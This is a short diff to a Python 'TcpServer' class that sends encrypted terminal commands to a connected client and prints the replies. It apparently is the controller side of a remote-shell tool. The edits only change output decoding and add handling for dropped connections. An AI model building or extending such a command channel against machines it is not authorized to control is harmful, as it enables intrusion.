@@ -124,7 +124,7 @@ class TcpServer:
             except KeyboardInterrupt:
                 print("\nExiting... Bye o/")
                 sys.exit()
-
+            
             while True:
                 # Input for terminal commands
                 
@@ -195,13 +195,16 @@ class TcpServer:
                     self.client.send(message_command_encrypted)
                     print('* Command sent!')
                     receive_message = self.client.recv(1024)
-                    descrypt_message = receive_message.decode("utf-8")
+                    descrypt_message = receive_message.decode("latin1")
                     print(f"{descrypt_message}")
 
                     #if message_command.startswith("cat"):
                         #time.sleep(5)
                 except KeyboardInterrupt:
                     print("\nExiting... Bye o/")
+                    sys.exit()
+                except BrokenPipeError:
+                    print("\nConnection Stoped By the Client! Exiting...")
                     sys.exit()
 
                 #self.client.close()
